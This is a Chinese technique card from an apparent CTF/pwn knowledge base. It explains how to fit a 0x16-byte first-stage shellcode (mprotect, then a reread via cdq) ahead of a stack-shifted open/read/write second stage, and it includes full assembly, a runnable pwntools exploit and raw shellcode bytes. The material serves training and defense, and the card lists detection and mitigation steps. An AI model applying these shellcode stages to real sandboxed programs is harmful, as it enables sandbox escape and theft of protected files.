---
id: binary-pwn-sandbox-escape-short-shellcode-mprotect-reread-rsp-shift
title: 0x16 字节短 shellcode 双手艺：shl edi,12 现算页基址 mprotect、cdq 取 0xffffffff 长度 reread，再 shl rsp 调栈执行 ORW
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: short-shellcode-mprotect-reread-rsp-shift
aliases:
- 16 字节 shellcode
- 短 shellcode 开权限再读
- shl edi,12
- cdq 得 0xffffffff
- shl rsp 调栈
- ShellcodeMaster
- reread staging
tags:
- pwn
- shellcode
- seccomp
- orw
- mprotect
- reread
- staging
- rsp
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V532
  verified_at: '2026-11-11T17:13:40+08:00'
  notes: 已对照原文13198与截图核对：main mmap(0x2333000,0x1000,RWX)+read 0x16+mprotect(buf,0x1000,4)+跳转（img58），第一段shl edi,12/mov dx,7/mov ax,10/syscall/cdq（img59/61），mprotect返回-12(0xfffffff4)后cdq使edx=0xffffffff并read(0,0x2333000,0xffffffff)（img60/61），第二段0x60 NOP+shl rsp,0xc;add rsp,0x500+ORW与原文exp一致。注意：mprotect部分生效/read写入该页的机制原文未解释，卡已标confidence medium并在边界中说明；原文7张xzfile远程图未下载，第二阶段成功截图未本地复核。dedup候选reread staging/jmp rsp/minimal shellcode均为不同构造。
---

## 一句话结论

当程序只允许输入 0x16 字节 shellcode、先 `mprotect(buf,0x1000,PROT_READ)` 再跳入执行时，可以用一段约 21 字节的第一阶段 shellcode：`shl edi,12` 由寄存器里的页内值现算出页基址 `0x2333000`，设 `dx=7`、`ax=10` 调 mprotect（原文调试中该调用返回 -12），紧跟 `cdq` 把负返回值变成 `edx=0xffffffff`，再 `read(0, 页基址, 0xffffffff)` 读入第二阶段 ORW shellcode；执行前用 `shl rsp,0xc; add rsp,0x500` 把 rsp 调到一个可写有效地址，避免 ORW 里的 push 触发 fault。

## 原理

- **输入预算极小**：`read(0, buf, 0x16uLL)` 只给 0x16（22）字节，放不下完整 ORW；必须用第一段 shellcode 完成“开权限/再读”，把完整载荷放到第二阶段。
- **现算页基址**：进入 shellcode 时 `edi` 中残留页内值 `0x2333`，`shl edi,12` 得到 `0x2333000`，正好是程序 `mmap` 的固定地址；这样不需要在 shellcode 里写 8 字节常量，节省字节。
- **mprotect 参数压缩**：`mov dx,0x7` 设置 prot=RWX，`mov ax,10` 设置 syscall 号 mprotect（只改低 16 位，依赖高位的 0），`syscall` 后接 `cdq`。
- **cdq 的双重用途**：`cdq` 把 EAX 的符号位扩展到 EDX。原文调试显示 mprotect 返回 `0xfffffff4`（-12，长度 0x2333 跨出已映射页导致 ENOMEM），于是 `cdq` 得到 `edx=0xffffffff`；随后 `mov esi,edi`（buf）、`xor edi,edi`（fd=0）、`xor eax,eax`（read syscall=0）、`syscall`，即 `read(0, 0x2333000, 0xffffffff)`，把第二阶段 shellcode 覆盖写回同一页。
- **rsp 调整**：第二阶段 ORW 会 push 字符串/参数，而当前 rsp 可能指向不可写区域或离映射太近；`shl rsp,0xc; add rsp,0x500` 把 rsp 挪到一个较大的可写地址（原文按现场值计算），保证 push 不 fault，然后自然衔接执行 ORW。
- **为什么可行（原文观察）**：第一段执行后 `read` 会把第二阶段写入 0x2333000 并继续向下执行，ORW 依次 `push "flag"`、`open`、`read`、`write` 输出 flag。原文调试显示 mprotect 返回 -12 但链仍打通；具体保护位与 read 落盘行为依赖环境，复现时应按原文靶机验证。

## 触发条件

- 程序 `mmap` 一块固定地址（原文 0x2333000）RWX 页，随后 `mprotect` 改为只读并把控制流跳到该页。
- 只允许 `read` 0x16 字节 shellcode，无 libc 泄露/ROP 空间。
- seccomp 允许 open/read/write（或至少允许第二阶段所需的 syscall），不允许 execve 时用 ORW。
- 进入 shellcode 时寄存器现场满足 `edi=页内值`（0x2333）等前提（与程序编译/调用方式相关）。

## 利用步骤

1. 确认 mmap 地址、`read` 长度（0x16）与 mprotect 保护位；在 gdb 中看进入 shellcode 时 `edi`/`rsi`/`rdx` 的残留值。
2. 发送第一段 shellcode（原文 asm）：
   ```asm
   shl edi,12        ; 0x2333 -> 0x2333000
   mov dx,0x7
   mov ax,10         ; mprotect
   syscall
   cdq               ; 负返回值 -> edx=0xffffffff
   mov esi,edi       ; buf
   xor edi,edi       ; fd=0
   xor eax,eax       ; read
   syscall
   ```
3. 发送第二阶段：`b'\x90'*0x60 + asm("shl rsp,0xc; add rsp,0x500;") + orw_shellcode`，其中 ORW 依次 open("flag")/read/write(1)。
4. 若 mprotect/read 的保护行为与原文不同，可调整 `dx`/长度或改用 `mprotect` 成功后再 read 的变体；也可用反复 push/pop + jmp 的第二种 16 字节构造（原文思路 2）。

## PoC

```python
from pwn import *
context.arch = 'amd64'
p = process('./pwn')

shell1 = asm('''
    shl edi,12
    mov dx,0x7
    mov ax,10
    syscall
    cdq
    mov esi,edi
    xor edi,edi
    xor eax,eax
    syscall
''')
p.sendafter(b'shellcode\n\n', shell1)

orw = asm('''
    push 0x67616c66      ; "flag"
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax              ; open
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x30
    xor eax,eax          ; read
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax              ; write
    syscall
''')
payload = b'\x90'*0x60 + asm("shl rsp,0xc; add rsp,0x500;") + orw
p.sendline(payload)
p.interactive()
```

第二构造（原文思路 2，21 字节内用 push/pop + jmp 循环）：

```text
\xbc\x00A@\x00\xc1\xe7\x0cj\nj\x07ZX\x0f\x05_V\x89\xce\xeb\xf6
```

## 变体与关联

- **寄存器复用 reread**：不调 mprotect、直接利用 read/write 后的寄存器现场做 0xb 字节 read 桩，见 [[binary-pwn-sandbox-escape-register-reuse-reread-staging]]。
- **最小 shellcode 预算**：21/22 字节 execve、43/56 字节 ORW 的字节预算表见 [[binary-pwn-sandbox-escape-minimal-shellcode-byte-budget-nul-free-scanf-badchar]]。
- **mprotect 后 jmp rsp**：ROP 调 mprotect 再跳 shellcode 的常规做法见 [[binary-pwn-rop-mprotect-jmprsp-shellcode-transition]]。
- **可见字符限制**：输入被限定为字母数字时见 [[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]。
- **边界**：该链高度依赖进入 shellcode 时的寄存器现场与页保护；mprotect 失败时 read 是否能写入只读页需按实际情况验证（原文调试显示 mprotect 返回 -12 但链仍成功）。若 seccomp 也禁 open/read，则需换 sendfile/openat 等允许的 syscall。

## 检测与防御

- **检测/审计**：mmap 固定地址 + 先改只读再跳转 + 只 read 0x16 字节的模式；短 shellcode 中出现 `shl edi,12`、`cdq`、连续 syscall；二进制未被 PIE/ASLR 随机化的固定映射地址。
- **防御**：不要执行用户输入的 shellcode；mmap 使用 PROT_NONE 后再按需分页；seccomp 白名单拒绝 open/read/write 组合（仅允许业务必需）；启用 PIE/ASLR 让固定地址不可预测；对可执行映射做 W^X。
